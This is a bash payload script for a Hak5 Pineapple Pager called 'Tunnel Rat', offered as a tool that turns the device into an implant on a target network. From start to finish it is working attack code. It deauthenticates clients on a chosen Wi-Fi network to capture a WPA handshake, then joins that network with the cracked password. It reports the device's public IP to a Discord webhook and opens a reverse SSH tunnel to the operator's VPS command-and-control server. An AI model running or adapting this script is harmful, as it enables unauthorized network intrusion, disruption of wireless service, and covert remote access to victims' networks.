#!/bin/bash
# Tunnel Rat
# github.com/OSINTI4L
# Tunnel Rat is a Hak5 Pineapple Pager payload that allows remote access to the pager through a virtual private server reverse SSH tunnel. This allows the pager to be used as an implant device allowing for remote exploitation of the target network. See attached README.md for full documentation and setup.
# Dependencies: sshpass | VPS | Discord webhook
# Built on Pineapple Pager firmware v1.0.6

MAPSSID="Name-Management-Portal-SSID-Here"
MAPPASS="Enter-Management-Portal-Password-Here"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/Enter/Discord/Webhook/Here"
VPSIP="X.X.X.X-Enter-VPS-C2-IP-Here"
SSHPW="Enter-VPS-C2-SSH-Password-Here"

# Enter target SSID:
TARGETSSID="$(TEXT_PICKER 'Enter target network SSID' '')"
    LOG red "Target network: $TARGETSSID"
    slep 1.5

# Scanning for target network:
spinner1=$(START_SPINNER "Scanning for target..")
    sleep 60
    TARGETMAC=$(_pineap RECON ISEARCH "$TARGETSSID" | awk '{print $1}' | head -n 1)
STOP_SPINNER "${spinner1}"
# If network, lock/log channel to target MAC, else exit:
if [ -n "$TARGETMAC" ]; then
    LOG green "Target network found!"
    sleep 1.5
    LOG blue "Optomizing for handshake capture.."
    sleep 1.5
    PINEAPPLE_EXAMINE_BSSID "$TARGETMAC"
    TARGETCH=$(_pineap RECON ISEARCH "$TARGETSSID" | grep -i "$TARGETSSID" | awk '{print $5}' | head -n 1)
    LOG green "Radio optomized."
    sleep 1.5
    LOG blue "Waiting for handshake capture.."
    sleep 1.5
else
    ALERT "Target Not Found!"
    LOG red "Exiting."
    exit 0
fi

# Check for PCAP:
CLEANMAC=$(echo "$TARGETMAC" | tr -d ':')
PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
DEAUTHTARG() {
    _pineap DEAUTH "$TARGETMAC" "FF:FF:FF:FF:FF:FF" "$TARGETCH"
}
 
 # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minute and check again, loop until PCAP:
if [ -n "$PCAP" ]; then
    LOG green "Handshake found!"
    sleep 1.5
else
    while [ -z "$PCAP" ]; do
        LOG red "Handshake not found!"
        sleep 1.5
        spinner2=$(START_SPINNER "Deauthing re-checking..")
        DEAUTHTARG
        sleep 60
        PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
        STOP_SPINNER "${spinner2}"
    done
        LOG green "Handshake found!"
        slep 1.5
fi

# Strip path from .pcap:
CLEANCAP=$(basename "$PCAP")
# Simplify file.extension:
cp /root/loot/handshakes/"$CLEANCAP" /root/loot/handshakes/"$TARGETSSID"_handshake.22000

# Reset recon mode:
LOG blue "Resuming channel hopping.."
PINEAPPLE_EXAMINE_RESET
sleep 10
LOG green "Channel hopping resumed."
sleep 1.5

# Spawn MGMT AP for PCAP retrieval:
WIFI_MGMT_AP wlan0mgmt "$MAPSSID" psk2 "$MAPPASS"
# Prompt for target network password:
TARGETPASS="$(TEXT_PICKER 'PCAP AVAILABLE' 'Enter target password')"
    LOG green "Password: $TARGETPASS"
    sleep 1.5
# Shutdown MGMT AP:
    spinner2=$(START_SPINNER "Shutting down $MAPSSID..")
        WIFI_MGMT_AP_DISABLE wlan0mgmt
        sleep 120
    STOP_SPINNER "${spinner2}"

# Get on network:
spinner3=$(START_SPINNER "Connecting to target network..")
    WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
    sleep 120
STOP_SPINNER "${spinner3}"

# Check for internet connectvity, else exit:
INETCHECK() {
        ping -c1 discord.com
}
if INETCHECK; then
	LOG green "Pineapple Pager is network connected!"
        PIP=$(curl -s https://api.ipify.org)
        curl -H "Content-Type: application/json" \
        -X POST \
        -d "{\"content\": \"Pineapple Pager network connected at: $PIP Attempting VPS C2 connection..\"}" \
        "$DISCORD_WEBHOOK"
        sleep 1
else
    ALERT "No Internet Connectivity!"
    LOG red "Exiting."
    exit 0
fi

# Check and establish reverse SSH tunnel to VPS C2:
PINGVPS() {
    ping -c1 "$VPSIP"
}
LOG blue "Checking status of VPS C2.."
sleep 1
if PINGVPS; then
    LOG green "VPS C2 online!"
    sleep 1
    spinner4=$(START_SPINNER "Establishing SSH tunnel..")
        (/mmc/usr/bin/sshpass -p "$SSHPW" ssh -o "StrictHostKeyChecking=no" -o "ConnectTimeout=10" -N -R 127.0.0.1:2222:localhost:22 root@"$VPSIP" &)
        sleep 10
    STOP_SPINNER "${spinner4}"
else
    ALERT "Cannot reach VPS C2!"
    LOG red "Exiting."
        curl -H "Content-Type: application/json" \
        -X POST \
        -d "{\"content\": \"VPS C2 not online! Exiting.\"}" \
        "$DISCORD_WEBHOOK"
    exit 0
fi

# Check if tunnel established:
TUNNELCHECK() {
    netstat -tnpa | grep "$VPSIP":22 | grep -i ESTABLISHED
}
if TUNNELCHECK; then
    sleep 1
    LOG green "Reverse SSH tunnel successfully established!"
    curl -H "Content-Type: application/json" \
    -X POST \
    -d "{\"content\": \"Reverse SSH tunnel successfully established! Access pager shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
    "$DISCORD_WEBHOOK"
else
    ALERT "VPS tunnel could not be established!"
    LOG red "Exiting."
        curl -H "Content-Type: application/json" \
        -X POST \
        -d "{\"content\": \"Reverse SSH tunnel could not be established! Exiting.\"}" \
        "$DISCORD_WEBHOOK"
    exit 0
fi
